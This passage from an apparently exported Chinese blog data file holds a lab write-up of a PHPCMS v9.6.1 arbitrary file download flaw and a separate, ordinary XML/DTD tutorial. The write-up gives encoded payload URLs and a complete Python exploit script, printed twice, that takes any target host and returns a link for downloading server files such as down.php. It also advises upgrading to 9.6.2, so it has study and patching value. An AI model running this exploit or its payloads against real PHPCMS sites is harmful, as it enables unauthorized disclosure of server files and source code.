遇到的问题</h2><p>得到下载连接访问页面，点击下载会报参数错误。</p>\n<p>解决办法：</p>\n<blockquote>\n<ul>\n<li><code>https://blog.csdn.net/vindraz/article/details/12579211</code></li>\n<li><code>http://www.cmsyou.com/support/172.html</code></li>\n</ul>\n</blockquote>\n<h2 id=\"0x04-修复建议\"><a href=\"#0x04-修复建议\" class=\"headerlink\" title=\"0x04 修复建议\"></a>0x04 修复建议</h2><p>升级PHPCMS版本到9.6.2或以上。</p>\n<h2 id=\"0x05-PoC\"><a href=\"#0x05-PoC\" class=\"headerlink\" title=\"0x05 PoC\"></a>0x05 PoC</h2><ul>\n<li>Github：<code>https://github.com/sh4douu/PoC-and-Exp/blob/master/phpcmsv961.py</code></li>\n<li>代码：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import re</span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; WOW64)&quot;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">def get_cookie1(host):</span><br><span class=\"line\">    url_1 = host + &quot;/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1&quot;</span><br><span class=\"line\">    print(&quot;[*] 请稍等...正在获取Cookie:&quot;)</span><br><span class=\"line\">    reponse = requests.get(url_1,headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    try:</span><br><span class=\"line\">        pattern = r&quot;.*siteid&quot;  #phpcmsv9 siteid字段格式为：xxxx_siteid,使用该正则匹配</span><br><span class=\"line\">        for item in reponse.cookies.keys():</span><br><span class=\"line\">            res = re.findall(pattern,item)</span><br><span class=\"line\"></span><br><span class=\"line\">            if res:</span><br><span class=\"line\">                cookie1 = reponse.cookies.get(res[0])</span><br><span class=\"line\">                print(&quot;[+] 获取到Cookie1:&quot;)</span><br><span class=\"line\">                print(&quot;[+] &quot; + res[0] + &quot;:&quot; + cookie1)</span><br><span class=\"line\">                return cookie1</span><br><span class=\"line\"></span><br><span class=\"line\">    except:</span><br><span class=\"line\">        print(&quot;[-] 获取Cookie1失败!&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">def get_cookie2(host,cookie1):</span><br><span class=\"line\">    #该payload实现下载phpcms/modules/content/down.php文件 </span><br><span class=\"line\">    payload = &quot;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dphpcms%2fmodules%2fcontent%2fdown.ph%26f=p%3%252%2*77C&quot;</span><br><span class=\"line\">    </span><br><span class=\"line\">    #payload = &quot;src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26f%3D%2Ep%25253chp%26s%3Dindex%26pade%3D&quot;</span><br><span class=\"line\">    #payload = &quot;src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D%2Ep%25253chp%26pade%3D&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">    url_2 = host + &quot;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;&quot; + payload</span><br><span class=\"line\">        </span><br><span class=\"line\">    data = &#123;&quot;userid_flash&quot;:cookie1&#125;  #将第一次得到的cookie作为&quot;userid_flash&quot;的值，并以POST方式提交</span><br><span class=\"line\">    reponse = requests.post(url_2,data=data,headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">    try:</span><br><span class=\"line\">        pattern = r&quot;.*att_json&quot; #phpcmsv9 att_json字段格式为：xxxx_att_json,使用该正则匹配</span><br><span class=\"line\">        for item in reponse.cookies.keys():</span><br><span class=\"line\">            res = re.findall(pattern,item)</span><br><span class=\"line\">            if res:</span><br><span class=\"line\">                cookie2 = reponse.cookies.get(res[0])</span><br><span class=\"line\">                print(&quot;[+] 获取到Cookie2:&quot;)</span><br><span class=\"line\">                print(&quot;[+] &quot; + res[0] + &quot;:&quot; + cookie2)</span><br><span class=\"line\">                return cookie2</span><br><span class=\"line\"></span><br><span class=\"line\">    except:</span><br><span class=\"line\">        print(&quot;[-] 获取Cookie2失败!&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">def help():</span><br><span class=\"line\">    print(&quot;-------------------------------------------------------------------------&quot;)</span><br><span class=\"line\">    print(&quot; [*] 使用说明：给出index.php之前的部分&quot;)</span><br><span class=\"line\">    print(&quot;       Usage: python3 phpcmsv9.py http://host:port&quot;)</span><br><span class=\"line\">    print(&quot;     Example：python3 phpcmsv9.py http://localhost/phpcms&quot;)</span><br><span class=\"line\">    print(&quot;-------------------------------------------------------------------------&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    if len(sys.argv) != 2:</span><br><span class=\"line\">        help()</span><br><span class=\"line\">        sys.exit(0)</span><br><span class=\"line\"></span><br><span class=\"line\">    host = sys.argv[1].strip()</span><br><span class=\"line\">    cookie1 = get_cookie1(host)</span><br><span class=\"line\">    cookie2 = get_cookie2(host,cookie1)</span><br><span class=\"line\"></span><br><span class=\"line\">    if cookie2:</span><br><span class=\"line\">        print(&quot;[+] Open link to download file: &quot;)</span><br><span class=\"line\">        print(&quot;[+] &quot; + host + &quot;/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=&quot; + cookie2) #最终文件下载连接</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-环境介绍\"><a href=\"#0x00-环境介绍\" class=\"headerlink\" title=\"0x00 环境介绍\"></a>0x00 环境介绍</h2><ul>\n<li>系统：Windows 10</li>\n<li>Phpstudy 2018</li>\n<li>CMS：PHPCMS v9.6.1<ul>\n<li>PHPCMS v9各版本下载地址：<code>http://download.phpcms.cn/v9/9.6/</code></li>\n</ul>\n</li>\n</ul>","more":"<h2 id=\"0x01-安装PHPCMS-v9\"><a href=\"#0x01-安装PHPCMS-v9\" class=\"headerlink\" title=\"0x01 安装PHPCMS v9\"></a>0x01 安装PHPCMS v9</h2><p>首先下载PHPCMS v9.6.1并解压，将解压得到的install_package目录拷贝到网站根目录下。</p>\n<p>启动phpstudy，访问<code>http://localhost/install_package/install/install.php</code>进入安装界面。</p>\n<p>依次点击下一步进行安装即可，数据库密码phpstudy默认是root/root。</p>\n<h2 id=\"0x02-漏洞利用\"><a href=\"#0x02-漏洞利用\" class=\"headerlink\" title=\"0x02 漏洞利用\"></a>0x02 漏洞利用</h2><p><strong>1.获取Cookie：xxx_siteid</strong></p>\n<p>首先访问<code>http://localhost/install_package/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1</code>并获取Cookie。</p>\n<p><img src=\"/2019/02/25/phpcms9-6-1/siteid.png\" alt></p>\n<p><strong>2.获取Cookie：xxx_att_json</strong></p>\n<p>访问<code>http://localhost/install_package/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C</code>，并将上一步获取的siteid的Cookie值作为POST字段userid_flash的值一同提交，然后从响应消息中找到xxx_att_json的Cookie值。</p>\n<p><img src=\"/2019/02/25/phpcms9-6-1/att_json.png\" alt></p>\n<p>要点：</p>\n<blockquote>\n<ul>\n<li><code>src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C</code>是payload，是我们要下载的文件。此处我们使用的payload实现要下载的文件是<code>/phpcms/modules/content/down.php</code>。</li>\n</ul>\n</blockquote>\n<p><strong>3.获取下载链接</strong></p>\n<p>访问<code>http://localhost/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=</code>，并将上一步得到的xxx_att_json的值作为a_k参数的值。</p>\n<blockquote>\n<p><code>http://localhost/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=61e9vtz6uMRQ6iACSVg06WBUXXslD430-hA7DDHM_5cMyGqOkQDeAPBXQURI2hDzEa-inCgLSjD2Ru66mQASlP3Qd06DqBJfeSuqMlZHaTOYO_VdhkWCDz8TD8SEQ3qoqho4ILiuVMSp7f_j05YY57YruJ1uIdHMbqaTyfClLBPv95lNtaRHQszhD9GZ0QEh8g</code></p>\n</blockquote>\n<p>访问过后，会返回一个带有下载按钮的页面，点击下载按钮即可下载。</p>\n<p><img src=\"/2019/02/25/phpcms9-6-1/download.png\" alt></p>\n<h2 id=\"0x03-遇到的问题\"><a href=\"#0x03-遇到的问题\" class=\"headerlink\" title=\"0x03 遇到的问题\"></a>0x03 遇到的问题</h2><p>得到下载连接访问页面，点击下载会报参数错误。</p>\n<p>解决办法：</p>\n<blockquote>\n<ul>\n<li><code>https://blog.csdn.net/vindraz/article/details/12579211</code></li>\n<li><code>http://www.cmsyou.com/support/172.html</code></li>\n</ul>\n</blockquote>\n<h2 id=\"0x04-修复建议\"><a href=\"#0x04-修复建议\" class=\"headerlink\" title=\"0x04 修复建议\"></a>0x04 修复建议</h2><p>升级PHPCMS版本到9.6.2或以上。</p>\n<h2 id=\"0x05-PoC\"><a href=\"#0x05-PoC\" class=\"headerlink\" title=\"0x05 PoC\"></a>0x05 PoC</h2><ul>\n<li>Github：<code>https://github.com/sh4douu/PoC-and-Exp/blob/master/phpcmsv961.py</code></li>\n<li>代码：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import re</span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; WOW64)&quot;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">def get_cookie1(host):</span><br><span class=\"line\">    url_1 = host + &quot;/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1&quot;</span><br><span class=\"line\">    print(&quot;[*] 请稍等...正在获取Cookie:&quot;)</span><br><span class=\"line\">    reponse = requests.get(url_1,headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    try:</span><br><span class=\"line\">        pattern = r&quot;.*siteid&quot;  #phpcmsv9 siteid字段格式为：xxxx_siteid,使用该正则匹配</span><br><span class=\"line\">        for item in reponse.cookies.keys():</span><br><span class=\"line\">            res = re.findall(pattern,item)</span><br><span class=\"line\"></span><br><span class=\"line\">            if res:</span><br><span class=\"line\">                cookie1 = reponse.cookies.get(res[0])</span><br><span class=\"line\">                print(&quot;[+] 获取到Cookie1:&quot;)</span><br><span class=\"line\">                print(&quot;[+] &quot; + res[0] + &quot;:&quot; + cookie1)</span><br><span class=\"line\">                return cookie1</span><br><span class=\"line\"></span><br><span class=\"line\">    except:</span><br><span class=\"line\">        print(&quot;[-] 获取Cookie1失败!&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">def get_cookie2(host,cookie1):</span><br><span class=\"line\">    #该payload实现下载phpcms/modules/content/down.php文件 </span><br><span class=\"line\">    payload = &quot;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dphpcms%2fmodules%2fcontent%2fdown.ph%26f=p%3%252%2*77C&quot;</span><br><span class=\"line\">    </span><br><span class=\"line\">    #payload = &quot;src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26f%3D%2Ep%25253chp%26s%3Dindex%26pade%3D&quot;</span><br><span class=\"line\">    #payload = &quot;src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D%2Ep%25253chp%26pade%3D&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">    url_2 = host + &quot;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;&quot; + payload</span><br><span class=\"line\">        </span><br><span class=\"line\">    data = &#123;&quot;userid_flash&quot;:cookie1&#125;  #将第一次得到的cookie作为&quot;userid_flash&quot;的值，并以POST方式提交</span><br><span class=\"line\">    reponse = requests.post(url_2,data=data,headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">    try:</span><br><span class=\"line\">        pattern = r&quot;.*att_json&quot; #phpcmsv9 att_json字段格式为：xxxx_att_json,使用该正则匹配</span><br><span class=\"line\">        for item in reponse.cookies.keys():</span><br><span class=\"line\">            res = re.findall(pattern,item)</span><br><span class=\"line\">            if res:</span><br><span class=\"line\">                cookie2 = reponse.cookies.get(res[0])</span><br><span class=\"line\">                print(&quot;[+] 获取到Cookie2:&quot;)</span><br><span class=\"line\">                print(&quot;[+] &quot; + res[0] + &quot;:&quot; + cookie2)</span><br><span class=\"line\">                return cookie2</span><br><span class=\"line\"></span><br><span class=\"line\">    except:</span><br><span class=\"line\">        print(&quot;[-] 获取Cookie2失败!&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">def help():</span><br><span class=\"line\">    print(&quot;-------------------------------------------------------------------------&quot;)</span><br><span class=\"line\">    print(&quot; [*] 使用说明：给出index.php之前的部分&quot;)</span><br><span class=\"line\">    print(&quot;       Usage: python3 phpcmsv9.py http://host:port&quot;)</span><br><span class=\"line\">    print(&quot;     Example：python3 phpcmsv9.py http://localhost/phpcms&quot;)</span><br><span class=\"line\">    print(&quot;-------------------------------------------------------------------------&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    if len(sys.argv) != 2:</span><br><span class=\"line\">        help()</span><br><span class=\"line\">        sys.exit(0)</span><br><span class=\"line\"></span><br><span class=\"line\">    host = sys.argv[1].strip()</span><br><span class=\"line\">    cookie1 = get_cookie1(host)</span><br><span class=\"line\">    cookie2 = get_cookie2(host,cookie1)</span><br><span class=\"line\"></span><br><span class=\"line\">    if cookie2:</span><br><span class=\"line\">        print(&quot;[+] Open link to download file: &quot;)</span><br><span class=\"line\">        print(&quot;[+] &quot; + host + &quot;/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=&quot; + cookie2) #最终文件下载连接</span><br></pre></td></tr></table></figure>"},{"title":"XML基本知识学习","date":"2019-02-28T07:10:47.000Z","_content":"\n## 0x00 XML概述\n\n- XML 指可扩展标记语言（eXtensible Markup Language）。\n- XML 的设计宗旨是传输数据，而不是显示数据。\n- XML 标签没有被预定义。\n- XML 被设计用来结构化、存储以及传输信息，实际上XML没有做任何事情。\n\n> XML只是以某种结构化形式组织数据，说它没有做任何事是他不会像HTML被渲染为形象色色的网页。\n\n<!-- more -->\n\n**XML与HTML**\n\n1.XML 和 HTML 为不同的目的而设计：\n\n> - XML 被设计用来传输和存储数据。\n> - HTML 被设计用来显示数据。\n\n2.HTML 中使用的标签都是预定义的，XML 允许创作者定义自己的标签和自己的文档结构。\n\n**3.XML 是独立于软件和硬件的信息传输工具。**\n\n## 0x01 XML结构\n\n> XML文档是树形结构的，由根元素扩展，且必须包含根元素。\n\n**一个栗子:**\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<note date=\"9102/2/28\">\n  <to>Mikasa</to>\n  <from>Allen</from>\n  <heading>Reminder</heading>\n  <body>Don't forget me this weekend!</body>\n</note>\n```\n\n- 第一行是XML声明，指定XML版本以及编码方式，声明是可选的。\n- `<note>`为根元素，XML标签都是成对且闭合的，以`</note>`闭合标签。\n- XML是大小写敏感的，`<note>`与`<Note>`是不同的标签。\n- 标签是可以设置属性的，如例子中`<note>`标签的`date`，但是属性的值必须使用引号括起来。\n\n**实体引用：**\n\n在 XML 中，一些字符拥有特殊的意义。\n\n例如，如果把字符 \"<\" 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。\n\n```\n<!-- 使用下面会发生错误 -->\n<message>if salary < 1000 then</message>\n```\n\n为了避免这个错误，用**实体引用**来代替 \"<\" 字符：\n\n```\n<message>if salary &lt; 1000 then</message>\n```\n\nXML有5个预定义的实体引用：\n\n![](xml\\QQ截图20190228152213.png)\n\n## 0x02 DTD\n\n文档类型定义（DTD）可定义合法的XML文档构建模块。\n\n**1.为什么使用DTD？**\n\n通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。\n\n通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。\n\n还可以用DTD 来验证从外部接收到的、自身的数据。\n\n**2.DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。**\n\ni.在文档内声明的栗子：`<!DOCTYPE root-element [element-declarations]>`\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    #定义此文档是 note 类型的文档。\n  <!ELEMENT note (to,from,heading,body)>   #定义note元素有四个元素：\"to、from、heading、body\"\n  <!ELEMENT to (#PCDATA)>\n  <!ELEMENT from (#PCDATA)>\n  <!ELEMENT heading (#PCDATA)>\n  <!ELEMENT body (#PCDATA)>   #定义body元素为\"#PCDATA\"类型\n]>\n<note>\n  <to>Mikasa</to>\n  <from>Allen</from>\n  <heading>Reminder</heading>\n  <body>Don't forget me this weekend</body>\n</note>\n```\n\nii.作为外部引用的例子：`<!DOCTYPE root-element SYSTEM \"filename\">`\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note SYSTEM \"note.dtd\">  #引用外部文件note.dtd\n<note>\n  <to>Mikasa</to>\n  <from>Allen</from>\n  <heading>Reminder</heading>\n  <body>Don't forget me this weekend!</body>\n</note>\n```\n\n`note.dtd`文件内容：\n\n```\n<!ELEMENT note (to,from,heading,body)>\n<!ELEMENT to (#PCDATA)>\n<!ELEMENT from (#PCDATA)>\n<!ELEMENT heading (#PCDATA)>\n<!ELEMENT body (#PCDATA)>\n```\n\n**3.DTD实体**\n\n**实体**是用于定义引用普通文本或特殊字符的快捷方式的变量。\n\n**实体引用**是对实体的引用。引用后会获得实体指向的实际数据。\n\n**实体声明也是在DTD声明中，与元素声明同级。**\n\ni.在文档内部声明实体的例子：`<!ENTITY entity-name \"entity-value\">`\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note ANY>   #定义note元素可以有任意元素。\n  \n  <!ENTITY entity1 \"Be\">      #文档内声明\n  <!ENTITY entity2 \"back.\">\n]>\n<note>&entity1; &entity2;</note>\n```\n\nii.外部声明引用实体的例子：`<!ENTITY entity-name SYSTEM \"URI/URL\">` or `<!DOCTYPE 根元素 PUBLIC \"public_ID\" \"文件名\">`\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note ANY>   \n  \n  <!ENTITY entity1 SYSTEM \"http://www.sakuxa.com/example.xml\">  #system关键字表示外部引用\n]>\n<note> &entity1;</note>\n```\n\niii.参数实体\n\n参数实体只用于 DTD 和文档的内部子集中。只有在DTD中才能引用参数实体，参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。\n\n**记住：%entity; 会被它指向的数据进行直接替换。**\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note ANY>   \n  \n  <!ENTITY % entity1 SYSTEM \"http://www.sakuxa.com/example.dtd\">\n  %entity1  #会被example.dtd内容替换\n]>\n<note> &entity2;</note>\n```\n\n`example.dtd`文件内容：\n\n```\n<!ENTITY entity2 \"Be back.\">\n```\n\n**注意：** 一个实体由三部分构成: 一个和号 (&), 一个实体名称, 以及一个分号 (;)。","source":"_posts/xml.md","raw":"---\ntitle: XML基本知识学习\ndate: 2019-02-28 15:10:47\ntags: \n\t- XML\n\t- Language\ncategories:\n\t- 语言\n---\n\n## 0x00 XML概述\n\n- XML 指可扩展标记语言（eXtensible Markup Language）。\n- XML 的设计宗旨是传输数据，而不是显示数据。\n- XML 标签没有被预定义。\n- XML 被设计用来结构化、存储以及传输信息，实际上XML没有做任何事情。\n\n> XML只是以某种结构化形式组织数据，说它没有做任何事是他不会像HTML被渲染为形象色色的网页。\n\n<!-- more -->\n\n**XML与HTML**\n\n1.XML 和 HTML 为不同的目的而设计：\n\n> - XML 被设计用来传输和存储数据。\n> - HTML 被设计用来显示数据。\n\n2.HTML 中使用的标签都是预定义的，XML 允许创作者定义自己的标签和自己的文档结构。\n\n**3.XML 是独立于软件和硬件的信息传输工具。**\n\n## 0x01 XML结构\n\n> XML文档是树形结构的，由根元素扩展，且必须包含根元素。\n\n**一个栗子:**\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<note date=\"9102/2/28\">\n  <to>Mikasa</to>\n  <from>Allen</from>\n  <heading>Reminder</heading>\n  <body>Don't forget me this weekend!</body>\n</note>\n```\n\n- 第一行是XML声明，指定XML版本以及编码方式，声明是可选的。\n- `<note>`为根元素，XML标签都是成对且闭合的，以`</note>`闭合标签。\n- XML是大小写敏感的，`<note>`与`<Note>`是不同的标签。\n- 标签是可以设置属性的，如例子中`<note>`标签的`date`，但是属性的值必须使用引号括起来。\n\n**实体引用：**\n\n在 XML 中，一些字符拥有特殊的意义。\n\n例如，如果把字符 \"<\" 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。\n\n```\n<!-- 使用下面会发生错误 -->\n<message>if salary < 1000 then</message>\n```\n\n为了避免这个错误，用**实体引用**来代替 \"<\" 字符：\n\n```\n<message>if salary &lt; 1000 then</message>\n```\n\nXML有5个预定义的实体引用：\n\n![](xml\\QQ截图20190228152213.png)\n\n## 0x02 DTD\n\n文档类型定义（DTD）可定义合法的XML文档构建模块。\n\n**1.为什么使用DTD？**\n\n通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。\n\n通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。\n\n还可以用DTD 来验证从外部接收到的、自身的数据。\n\n**2.DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。**\n\ni.在文档内声明的栗子：`<!DOCTYPE root-element [element-declarations]>`\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    #定义此文档是 note 类型的文档。\n  <!ELEMENT note (to,from,heading,body)>   #定义note元素有四个元素：\"to、from、heading、body\"\n  <!ELEMENT to (#PCDATA)>\n  <!ELEMENT from (#PCDATA)>\n  <!ELEMENT heading (#PCDATA)>\n  <!ELEMENT body (#PCDATA)>   #定义body元素为\"#PCDATA\"类型\n]>\n<note>\n  <to>Mikasa</to>\n  <from>Allen</from>\n  <heading>Reminder</heading>\n  <body>Don't forget me this weekend</body>\n</note>\n```\n\nii.作为外部引用的例子：`<!DOCTYPE root-element SYSTEM \"filename\">`\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note SYSTEM \"note.dtd\">  #引用外部文件note.dtd\n<note>\n  <to>Mikasa</to>\n  <from>Allen</from>\n  <heading>Reminder</heading>\n  <body>Don't forget me this weekend!</body>\n</note>\n```\n\n`note.dtd`文件内容：\n\n```\n<!ELEMENT note (to,from,heading,body)>\n<!ELEMENT to (#PCDATA)>\n<!ELEMENT from (#PCDATA)>\n<!ELEMENT heading (#PCDATA)>\n<!ELEMENT body (#PCDATA)>\n```\n\n**3.DTD实体**\n\n**实体**是用于定义引用普通文本或特殊字符的快捷方式的变量。\n\n**实体引用**是对实体的引用。引用后会获得实体指向的实际数据。\n\n**实体声明也是在DTD声明中，与元素声明同级。**\n\ni.在文档内部声明实体的例子：`<!ENTITY entity-name \"entity-value\">`\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note ANY>   #定义note元素可以有任意元素。\n  \n  <!ENTITY entity1 \"Be\">      #文档内声明\n  <!ENTITY entity2 \"back.\">\n]>\n<note>&entity1; &entity2;</note>\n```\n\nii.外部声明引用实体的例子：`<!ENTITY entity-name SYSTEM \"URI/URL\">` or `<!DOCTYPE 根元素 PUBLIC \"public_ID\" \"文件名\">`\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note ANY>   \n  \n  <!ENTITY entity1 SYSTEM \"http://www.sakuxa.com/example.xml\">  #system关键字表示外部引用\n]>\n<note> &entity1;</note>\n```\n\niii.参数实体\n\n参数实体只用于 DTD 和文档的内部子集中。只有在DTD中才能引用参数实体，参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。\n\n**记住：%entity; 会被它指向的数据进行直接替换。**\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note ANY>   \n  \n  <!ENTITY % entity1 SYSTEM \"http://www.sakuxa.com/example.dtd\">\n  %entity1  #会被example.dtd内容替换\n]>\n<note> &entity2;</note>\n```\n\n`example.dtd`文件内容：\n\n```\n<!ENTITY entity2 \"Be back.\">\n```\n\n**注意：** 一个实体由三部分构成: 一个和号 (&), 一个实体名称, 以及一个分号 (;)。","slug":"xml","published":1,"updated":"2019-03-01T06:54:45.175Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjszpjg8i000cj8r05mspp02i","content":"<h2 id=\"0x00-XML概述\"><a href=\"#0x00-XML概述\" class=\"headerlink\" title=\"0x00 XML概述\"></a>0x00 XML概述</h2><ul>\n<li>XML 指可扩展标记语言（eXtensible Markup Language）。</li>\n<li>XML 的设计宗旨是传输数据，而不是显示数据。</li>\n<li>XML 标签没有被预定义。</li>\n<li>XML 被设计用来结构化、存储以及传输信息，实际上XML没有做任何事情。</li>\n</ul>\n<blockquote>\n<p>XML只是以某种结构化形式组织数据，说它没有做任何事是他不会像HTML被渲染为形象色色的网页。</p>\n</blockquote>\n<a id=\"more\"></a>\n<p><strong>XML与HTML</strong></p>\n<p>1.XML 和 HTML 